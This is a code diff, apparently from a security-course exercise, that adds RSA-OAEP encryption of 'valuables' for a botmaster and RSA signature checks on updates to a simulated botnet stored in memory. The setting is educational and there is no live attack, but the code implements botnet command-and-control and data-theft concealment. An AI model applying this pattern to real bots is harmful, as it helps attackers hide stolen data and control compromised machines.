@@ -1,19 +1,39 @@
 import os
+from Crypto.PublicKey import RSA
+from Crypto.Signature import PKCS1_v1_5
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Hash import SHA256
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
 # Valuable data to be sent to the botmaster
 valuables = []
-
+# Length of signature to split updates
+SIGNATURE_LEN = 512
 ###
 
 def save_valuable(data):
     valuables.append(data)
 
 def encrypt_for_master(data):
-    # Encrypt the file so it can only be read by the bot master
-    return data
+    # Encrypt the file so it can only be read by the master bot
+    # I.e Use the master bots' public key to encrypt the data
+
+    # QUESTIONS:
+    # Do we need to pad the data to avoid 'textbook' RSA?
+    # How do we cope with data of 'arbitrary size'?
+    
+    # Read masters' public key PEM file
+    file = open(os.path.join("pastebot.net/publickeys", "master_pubkey.pem"), "r")
+    # Import masters' public key
+    pubkey = RSA.importKey(file.read())
+    file.close()
+    # Create new OAEP cipher with masters' public key and SHA256 Hashing algorithm
+    cipher = PKCS1_OAEP.new(pubkey, hashAlgo=SHA256)
+    # Encrypt data with OAEP cipher
+    ciphertext = cipher.encrypt(data)
+    return ciphertext
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -31,14 +51,19 @@ def upload_valuables_to_pastebot(fn):
 ###
 
 def verify_file(f):
+    # Open master public key
+    file = open(os.path.join("pastebot.net/publickeys", "master_pubkey.pem"), "r")
     # Verify the file was sent by the bot master
-    # TODO: For Part 2, you'll use public key crypto here
-    # Naive verification by ensuring the first line has the "passkey"
-    lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
-        return True
-    return False
+    key = RSA.importKey(file.read())
+    file.close()
+    # Seperate signature
+    signature = f[:SIGNATURE_LEN]
+    # Seperate hashed file
+    hashed_f = SHA256.new(f[SIGNATURE_LEN:])
+    # Create new PKSC1_v1_5 Signature Scheme object
+    verifier = PKCS1_v1_5.new(key)
+    # Return result of verification
+    return verifier.verify(hashed_f,signature)
 
 def process_file(fn, f):
     if verify_file(f):
